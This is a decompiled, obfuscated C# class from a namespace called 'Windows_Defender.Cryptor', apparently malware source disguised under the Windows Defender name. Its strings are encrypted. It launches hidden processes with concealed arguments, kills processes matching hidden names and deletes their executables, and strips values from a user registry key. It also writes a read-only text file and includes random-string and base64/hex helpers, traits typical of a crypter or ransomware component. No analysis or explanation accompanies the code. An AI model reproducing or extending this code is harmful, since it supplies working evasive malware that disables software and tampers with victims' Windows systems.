using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Windows_Defender.Cryptor;

internal sealed class Tools
{
	[Serializable]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9 = new _003C_003Ec();

		public static Func<Match, string> _003C_003E9__0_0;

		public static Func<string, IEnumerable<char>> _003C_003E9__3_0;

		public static Func<char, Guid> _003C_003E9__3_1;

		public static Func<string, IEnumerable<char>> _003C_003E9__3_2;

		public static Func<char, Guid> _003C_003E9__3_3;

		internal string method_0(Match match_0)
		{
			return match_0.Value;
		}

		internal IEnumerable<char> method_1(string string_0)
		{
			return string_0;
		}

		internal Guid method_2(char char_0)
		{
			return Guid.NewGuid();
		}

		internal IEnumerable<char> method_3(string string_0)
		{
			return string_0;
		}

		internal Guid method_4(char char_0)
		{
			return Guid.NewGuid();
		}
	}

	public static string[] smethod_0(string string_0, int int_0)
	{
		return Regex.Matches(string_0, Class8.smethod_1(-2084952122) + int_0 + Class8.smethod_1(-2084952119)).Cast<Match>().Select(_003C_003Ec._003C_003E9.method_0)
			.ToArray();
	}

	public static void smethod_1()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Class8.smethod_1(-2084952111);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			string[] array = new string[7]
			{
				Class8.smethod_1(-2084952153),
				Class8.smethod_1(-2084952176),
				Class8.smethod_1(-2084952452),
				Class8.smethod_1(-2084952533),
				Class8.smethod_1(-2084952334),
				Class8.smethod_1(-2084952353),
				Class8.smethod_1(-2084952391)
			};
			foreach (string arguments in array)
			{
				process.StartInfo.Arguments = arguments;
				process.Start();
				process.WaitForExit();
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName.ToLower().Contains(Class8.smethod_1(-2084952423)) || process2.ProcessName.ToLower() == Class8.smethod_1(-2084952733) || process2.ProcessName.ToLower() == Class8.smethod_1(-2084952720) || process2.MainModule!.FileName!.ToLower().Contains(Class8.smethod_1(-2084952733)))
				{
					try
					{
						process2.Kill();
						Class2.smethod_5(process2.MainModule!.FileName);
					}
					catch (Exception)
					{
					}
				}
			}
			string name = Class8.smethod_1(-2084952764);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			if (registryKey != null)
			{
				array = registryKey.GetValueNames();
				foreach (string text in array)
				{
					Console.WriteLine(text);
					if (text.StartsWith(Class8.smethod_1(-2084952772)))
					{
						registryKey.DeleteValue(text, throwOnMissingValue: true);
					}
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void smethod_2(string string_0, string string_1)
	{
		string text = Class8.smethod_1(-2084952826);
		string[] array = smethod_0(string_1, 58);
		string text2 = null;
		for (int i = 0; i < array.Length; i++)
		{
			text2 += array[i];
			if (i != array.Length - 1)
			{
				text2 += Environment.NewLine;
			}
		}
		text = text.Replace(Class8.smethod_1(-2084958214), text2);
		text = text.Replace(Class8.smethod_1(-2084958258), Class8.smethod_1(-2084958244));
		text = text.Replace(Class8.smethod_1(-2084958281), Class8.smethod_1(-2084958336));
		try
		{
			string_0 += Class8.smethod_1(-2084958614);
			File.WriteAllBytes(string_0, Encoding.UTF8.GetBytes(text));
			File.SetAttributes(string_0, FileAttributes.ReadOnly);
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_3(int int_0)
	{
		switch (int_0)
		{
		case 0:
		{
			int num2 = 0;
			num2 = new Random().Next(32, 42);
			return new string(Enumerable.Repeat(Class8.smethod_1(-2084958646), num2).SelectMany(_003C_003Ec._003C_003E9.method_1).OrderBy(_003C_003Ec._003C_003E9.method_2)
				.Take(num2)
				.ToArray());
		}
		case 1:
			return Convert.ToString(new Random().Next(0, 9));
		case 2:
			new Random();
			return new string(Enumerable.Repeat(Class8.smethod_1(-2084958693), 12).SelectMany(_003C_003Ec._003C_003E9.method_3).OrderBy(_003C_003Ec._003C_003E9.method_4)
				.Take(12)
				.ToArray()) + Class8.smethod_1(-2084958560) + Class8.smethod_1(-2084952285).Remove(0, 1) + Class8.smethod_1(-2084958552);
		case 3:
		{
			string text = null;
			string text2 = Class8.smethod_1(-2084958693);
			Random random = new Random();
			int num = random.Next(12, 24);
			while (num-- > 0)
			{
				text += text2[random.Next(text2.Length)];
			}
			return text;
		}
		default:
			return null;
		}
	}

	public static string smethod_4(int int_0, int int_1, string string_0)
	{
		if (int_0 == 0 && int_1 == 0)
		{
			return Convert.ToBase64String(Encoding.Unicode.GetBytes(string_0));
		}
		if (int_0 == 0 && int_1 == 1)
		{
			byte[] bytes = Convert.FromBase64String(string_0);
			return Encoding.UTF8.GetString(bytes);
		}
		if (int_0 == 1 && int_1 == 0)
		{
			return BitConverter.ToString(Encoding.UTF8.GetBytes(string_0)).Replace(Class8.smethod_1(-2084958544), string.Empty);
		}
		return null;
	}
}
